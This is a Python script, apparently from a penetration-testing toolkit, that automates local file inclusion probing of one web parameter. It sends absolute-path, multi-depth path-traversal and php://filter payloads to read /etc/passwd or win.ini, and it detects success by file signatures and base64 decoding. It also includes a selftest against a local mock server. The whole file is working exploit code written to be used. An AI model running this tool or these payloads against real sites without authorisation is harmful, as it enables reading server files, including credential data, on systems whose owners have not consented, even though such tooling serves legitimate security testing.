#!/usr/bin/env python3
"""lfi_probe.py — file-read ramp for one parameter. Stdlib only (httpkit).

file-read-primitives orders the probes: an absolute path the target
certainly has, then traversal at increasing depth, then the php://filter
wrapper that turns an include into a base64 read. This fires exactly that
ramp against the same baseline and grades each response by a known-file
signature (`root:.*:0:0`, `[extensions]` in win.ini) or by decodable
base64 for the filter form. Every hit is a channel CANDIDATE with the
verbatim signature excerpt — 'a file came back' is a measurement to
confirm with the class's own probe, never a finding by itself.

    python3 tools/web/lfi_probe.py --url 'http://h/page?f=home' --param f
    python3 tools/web/lfi_probe.py --url 'http://h/p?f=inc' --param f --target win.ini
    python3 tools/web/lfi_probe.py --selftest
"""
from __future__ import annotations

import argparse
import base64
import re
import sys
import time
import urllib.parse

import httpkit

_LINUX_FILE, _LINUX_SIG = "/etc/passwd", re.compile(r"root:[x*]?:0:0")
_WIN_FILE, _WIN_SIG = "C:\\Windows\\win.ini", re.compile(r"\[(?:fonts|extensions)\]", re.I)
_MAX_B64 = 200_000


def _fire(args, value):
    url, body = args["url"], args.get("body")
    if args.get("param"):
        if args.get("method", "GET") == "GET":
            q = urllib.parse.urlparse(url)
            pairs = urllib.parse.parse_qsl(q.query, keep_blank_values=True)
            pairs = [(k, value if k == args["param"] else v) for k, v in pairs]
            if args["param"] not in [k for k, _ in pairs]:
                pairs.append((args["param"], value))
            url = urllib.parse.urlunparse(q._replace(query=urllib.parse.urlencode(pairs)))
        else:
            enc = urllib.parse.urlencode({args["param"]: value})
            body = enc if not body else body + "&" + enc
    elif body:
        body = body.replace("{M}", urllib.parse.quote_plus(value))
    else:
        url = url.replace("{M}", urllib.parse.quote(value, safe=""))
    r = httpkit.request(url, method=args.get("method", "GET"),
                        headers=args.get("headers"), body=body,
                        timeout=args.get("timeout", 15))
    return r


def _text(r):
    b = r.get("body", "")
    return b.decode("utf-8", "replace") if isinstance(b, bytes) else (b or "")


def _grade(body, target):
    m = (_LINUX_SIG if target == "linux" else _WIN_SIG).search(body)
    if m:
        return m.group(0), body[max(0, m.start() - 20):m.end() + 60]
    return None, None


def ramp(args) -> dict:
    target = args.get("target", "linux")
    want = _LINUX_FILE if target == "linux" else _WIN_FILE
    base = _fire(args, args.get("value", "index"))
    b_len = len(_text(base))
    out = {"url": args["url"], "param": args.get("param"), "target": target,
           "baseline_len": b_len, "cases": []}

    variants = [("absolute", want)]
    for depth in range(1, 9):
        for sep, name in (("../", "dotdot"), ("..%2f", "enc-dotdot"),
                          ("....//", "doubled"), ("..\\", "backslash")):
            variants.append((f"{name}x{depth}", sep * depth + want.lstrip("/")))
    variants.append(("php-filter",
                     f"php://filter/convert.base64-encode/resource={want}"))

    hits = []
    for name, path in variants:
        r = _fire(args, path)
        body = _text(r)
        rec = {"variant": name, "path": path, "status": r.get("status"),
               "len": len(body)}
        sig, excerpt = _grade(body, target)
        if sig:
            rec["file_sig"] = sig
            rec["excerpt"] = excerpt
            hits.append(rec)
        elif name == "php-filter":
            t = body.strip()
            if 16 < len(t) < _MAX_B64 and re.fullmatch(r"[A-Za-z0-9+/=\s]+", t):
                try:
                    dec = base64.b64decode(t).decode("utf-8", "replace")
                    s2, ex2 = _grade(dec, target)
                    rec["b64_decodes"] = True
                    if s2:
                        rec["file_sig"], rec["excerpt"] = s2, ex2
                        hits.append(rec)
                except Exception:
                    rec["b64_decodes"] = False
        out["cases"].append(rec)

    out["read_candidates"] = hits
    out["candidate_only"] = True
    if not hits:
        out["note"] = ("no variant returned the known file — record as "
                       "inconclusive (extension append / filter may still "
                       "block); check references/traversal-and-wrappers.md")
    return out


def _selftest() -> int:
    import threading
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
    passwd = "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin\n"

    class Fs(BaseHTTPRequestHandler):
        def do_GET(self):
            q = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
            v = q.get("f", [""])[0]
            body = b"welcome"
            if v.endswith("etc/passwd") or v.endswith("etc\\passwd"):
                body = passwd.encode()
            elif v.startswith("php://filter") and "etc/passwd" in v:
                body = base64.b64encode(passwd.encode())
            self.send_response(200)
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, *_a):
            pass

    srv = ThreadingHTTPServer(("127.0.0.1", 0), Fs)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    url = f"http://127.0.0.1:{srv.server_address[1]}/?f=home"
    out = ramp({"url": url, "param": "f", "method": "GET", "timeout": 15,
                "target": "linux"})
    srv.shutdown()
    kinds = {h["variant"] for h in out["read_candidates"]}
    assert "absolute" in kinds and "php-filter" in kinds, out
    assert any(k.startswith("dotdot") for k in kinds), kinds
    print("lfi_probe selftest: ok")
    return 0


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0],
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--url")
    ap.add_argument("--param")
    ap.add_argument("--value", default="index", help="known-good baseline value")
    ap.add_argument("--target", default="linux", choices=["linux", "windows"])
    ap.add_argument("--method", default="GET", choices=["GET", "POST"])
    ap.add_argument("--body", help="POST body; {M} marks the injection slot")
    ap.add_argument("--headers", nargs="*")
    ap.add_argument("--timeout", type=float, default=15)
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args(argv)
    if args.selftest:
        return _selftest()
    if not args.url or not (args.param or args.body or "{M}" in args.url):
        ap.print_help()
        return 2
    a = vars(args) | {"headers": httpkit.parse_headers(args.headers)}
    httpkit.jprint(ramp(a))
    return 0


if __name__ == "__main__":
    sys.exit(main())
